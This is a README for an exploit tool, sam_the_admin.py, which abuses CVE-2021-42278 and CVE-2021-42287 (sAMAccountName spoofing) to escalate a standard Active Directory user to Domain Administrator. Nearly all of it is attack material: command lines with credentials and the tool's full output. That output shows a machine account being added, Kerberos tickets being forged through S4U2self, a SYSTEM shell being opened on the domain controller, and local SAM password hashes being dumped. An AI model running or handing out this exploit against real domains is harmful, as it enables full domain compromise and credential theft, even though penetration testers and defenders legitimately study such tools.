Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 

usage:

$ python3 sam_the_admin.py "jas502n/hr:Admin@12" -dc-ip 172.16.242.135 -shell

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Selected Target dc01.jas502n.com
[*] Total Domain Admins 1
[*] will try to impersonat Administrator
[*] Current ms-DS-MachineAccountQuota = 10
[*] Adding Computer Account "SAMTHEADMIN-59$"
[*] MachineAccount "SAMTHEADMIN-59$" password = @L!LeScGKcBA
[*] Successfully added machine account SAMTHEADMIN-59$ with password @L!LeScGKcBA.
[*] SAMTHEADMIN-59$ object = CN=SAMTHEADMIN-59,CN=Computers,DC=jas502n,DC=com
[*] SAMTHEADMIN-59$ sAMAccountName == dc01
[*] Saving ticket in dc01.ccache
[*] Resting the machine account to SAMTHEADMIN-59$
[*] Restored SAMTHEADMIN-59$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] Saving ticket in Administrator.ccache
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

or

$ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -dump                                                                                                                                         1 ↵
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Selected Target dc01.jas502n.com
[*] Total Domain Admins 1
[*] will try to impersonat Administrator
[*] Current ms-DS-MachineAccountQuota = 10
[*] Adding Computer Account "SAMTHEADMIN-78$"
[*] MachineAccount "SAMTHEADMIN-78$" password = @jokz76QG*AM
[*] Successfully added machine account SAMTHEADMIN-78$ with password @jokz76QG*AM.
[*] SAMTHEADMIN-78$ object = CN=SAMTHEADMIN-78,CN=Computers,DC=jas502n,DC=com
[*] SAMTHEADMIN-78$ sAMAccountName == dc01
[*] Saving ticket in dc01.ccache
[*] Resting the machine account to SAMTHEADMIN-78$
[*] Restored SAMTHEADMIN-78$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] Saving ticket in Administrator.ccache
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xf55f3cbfbd2cd42d781e383341084ff5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb136a448767792bae25563a498a86e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

### Known issues
- it will not work outside kali , i will update it later on :)

#### Check out 
- [CVE-2021-42287/CVE-2021-42278 Weaponisation ](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [sAMAccountName spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
